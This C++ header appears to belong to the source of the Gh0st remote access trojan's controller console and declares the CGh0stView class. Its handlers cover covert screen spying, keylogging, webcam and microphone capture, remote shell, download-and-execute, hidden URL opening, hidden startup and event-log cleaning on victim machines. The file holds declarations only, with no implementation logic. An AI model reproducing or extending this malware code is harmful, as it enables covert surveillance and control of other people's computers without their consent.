// gh0stView.h : interface of the CGh0stView class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_XXXVIEW_H__5EB7F8EB_1205_453A_984F_EC209D04F238__INCLUDED_)
#define AFX_XXXVIEW_H__5EB7F8EB_1205_453A_984F_EC209D04F238__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CGh0stDoc;
#include "SEU_QQwry.h"	// Added by ClassView
class CGh0stView : public CXTPReportView
{
protected: // create from serialization only
	SEU_QQwry *m_QQwry;
	CGh0stView();
	DECLARE_DYNCREATE(CGh0stView)

// Attributes
public:
	CGh0stDoc* GetDocument();
// Operations
public:
	CXTPReportControl m_wndReport;
	char *SwitchSystem(OSVERSIONINFOEX OsVerInfoEx);
	void UpGroupNum();
	void AddtoReportView(ClientContext	*pContext, MYLOGIN*	LoginInfo, CXTPReportRecords* Records, int i, CXTPReportRecord* NewRecord);
	void SendSelectCommand(PBYTE pData, UINT nSize);
	void SendDllCommand(LPCTSTR lpDllName, LPBYTE blparam, DWORD datasize);
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CGh0stView)
	public:
	virtual void OnDraw(CDC* pDC);  // overridden to draw this view
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	//}}AFX_VIRTUAL

// Implementation
public:
	virtual ~CGh0stView();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:
	afx_msg void OnReportItemDblClick(NMHDR * pNotifyStruct, LRESULT * result);
	afx_msg void OnReportItemRClick(NMHDR * pNotifyStruct, LRESULT * result);
// Generated message map functions
protected:
	//{{AFX_MSG(CGh0stView)
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnSetFocus(CWnd* pOldWnd);
	afx_msg BOOL OnEraseBkgnd(CDC* pDC);
	afx_msg void OnFilemanager();
	afx_msg void OnScreenspy();
	afx_msg void OnKeyboard();
	afx_msg void OnRemoteshell();
	afx_msg void OnSystem();
	afx_msg void OnWebcam();
	afx_msg void OnAudioListen();
	afx_msg void OnRemove();
	afx_msg void OnLogoff();
	afx_msg void OnReboot();
	afx_msg void OnShutdown();
	afx_msg void OnDownexec();
	afx_msg void OnUpdateServer();
	afx_msg void OnOpenUrlHide();
	afx_msg void OnOpenUrlShow();
	afx_msg void OnCleanevent();
	afx_msg void OnSelectAll();
	afx_msg void OnUnselectAll();
	afx_msg void OnChangegroup();
	afx_msg void OnRenameRemark();
	afx_msg void OnSendMsg();
	afx_msg void OnProxy();
	afx_msg void OnRegedit();
	afx_msg void OnServices();
	afx_msg void OnStartHide();
	afx_msg void OnNoStart();
	afx_msg void OnStartNormal();
	afx_msg void OnstopSD();
	afx_msg void OnSysinfo();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnWebCamNoDevice(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenRegeditDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenServersDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSysInfoDialog(WPARAM, LPARAM);
};

#ifndef _DEBUG  // debug version in XXXView.cpp
inline CGh0stDoc* CGh0stView::GetDocument()
	{ return (CGh0stDoc*)m_pDocument; }
#endif

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_XXXVIEW_H__5EB7F8EB_1205_453A_984F_EC209D04F238__INCLUDED_)
